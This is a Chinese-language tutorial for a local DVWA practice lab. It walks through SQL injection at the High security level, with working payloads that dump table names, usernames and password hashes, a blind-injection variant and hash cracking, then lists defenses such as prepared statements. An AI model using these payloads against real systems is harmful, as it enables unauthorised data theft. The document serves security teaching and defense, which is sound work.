# DVWA SQL 注入 · High 级别实战教学指南

> 适用：DVWA 官方版（github.com/digininja/DVWA）· 本地授权靶场
> 声明：仅用于自有靶场学习，严禁对未授权目标测试

## 一、环境准备

1. **Web 环境**：XAMPP / WAMP / LAMP 或 Docker（含 Apache + MySQL + PHP）
2. **DVWA**：从官方仓库 https://github.com/digininja/DVWA 克隆到 Web 目录
3. **浏览器**：Firefox / Chrome，可装 HackBar、Burp Suite（可选，推荐）
4. **切换安全级别**：
   - 访问 `http://localhost/dvwa`，用 `admin / password` 登录
   - 左侧菜单 → **DVWA Security** → 选 `high` → Submit
   - 进入 **SQL Injection** 页面

## 二、High 级别的真实机制（据官方源码）

**先纠正一个常见错误**：High 级别**并没有用预处理语句，也没有关键词正则过滤**。

官方源码 `vulnerabilities/sqli/source/high.php` 的关键部分：

```php
// 输入先由上一个页面存入 session，这里再读出
$id = $_SESSION[ 'id' ];

$query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;";
$result = mysqli_query($GLOBALS["___mysqli_ston"], $query) or die(...);
```

所以 High 的两道"障眼法"其实是：

1. **输入 / 输出分离**：ID 先在一个独立页面提交、存进 `$_SESSION`，再重定向到结果页显示。这只是界面上的变化，**不影响注入**。
2. **`LIMIT 1`**：查询只返回一条记录，把 `UNION SELECT` 的第二行数据挡住。

而且要特别注意：High **没有** `mysqli_real_escape_string()` 转义（那是 Medium 用的），所以单引号可以**直接闭合**。

> 对比一下：真正用预处理语句（PDO `prepare` + `bindParam`）、并先做 `is_numeric` 校验的是 **Impossible** 级别——那才是堵死注入的写法。

## 三、手工注入步骤（附 Payload）

### 步骤 1：判断注入点与闭合方式

- 输入 `1`，正常返回用户信息
- 输入 `1'`，页面报错 → 存在字符型注入，单引号可闭合

### 步骤 2：绕过 LIMIT 1（关键）

```sql
1' union select 1,2 #
```

- `1'` 闭合原查询的单引号
- `union select 1,2` 补上两个字段（对应 first_name / last_name）
- `#` 注释掉后面的 ` LIMIT 1`，让 UNION 的第二行能显示出来

成功后页面会显示 `1` 和 `2` 两个回显位。

### 步骤 3：确认字段数

```sql
1' order by 2 #     -- 正常
1' order by 3 #     -- 报错 → 说明一共 2 列
```

### 步骤 4：爆库 / 爆表 / 爆字段

```sql
-- 当前库名 + 版本
1' union select database(), version() #

-- 所有表名
1' union select 1, group_concat(table_name) from information_schema.tables where table_schema = database() #

-- users 表的字段名
1' union select 1, group_concat(column_name) from information_schema.columns where table_name = 'users' #

-- 直接脱库（用户名 + 密码哈希）
1' union select user, password from users #
```

### 步骤 5：破解密码哈希

拿到的 `password` 是 MD5 值，用 CrackStation 或 Hashcat / John the Ripper 破解（例：`5f4dcc3b5aa765d61d8327deb882cf99` → `password`）。

### 备选：布尔盲注

若回显被限制，可退化为盲注，逐位猜解：

```sql
1' and (select substring(password,1,1) from users where user='admin')='a' #
```

## 四、防御措施（修复建议）

1. **预处理语句（参数化查询）** —— 最有效，让用户输入永远只当"数据"处理：

   ```php
   $stmt = $db->prepare('SELECT first_name, last_name FROM users WHERE user_id = :id');
   $stmt->bindParam(':id', $id, PDO::PARAM_INT);
   $stmt->execute();
   ```

2. **输入校验**：强制类型（`is_numeric` + `intval`），白名单
3. **最小权限**：Web 数据库账户不给 `DROP` / `FILE` 权限
4. **关闭错误回显**：`display_errors = Off`，自定义错误页
5. **WAF**：拦截常见注入特征
6. **代码审计**：定期检查数据库查询写法

## 五、总结与学习建议

- High 级别考的是**理解 `LIMIT 1` 的绕过**（用注释符），并认识到"输入输出分离"只是表面功夫
- 学习顺序：Low → Medium → High → Impossible，体会每一级防护的差异
- 工具：手工注入练原理，熟练后用 sqlmap 提效
- 深入：读源码（`vulnerabilities/sqli/source/*.php`）是提升的关键
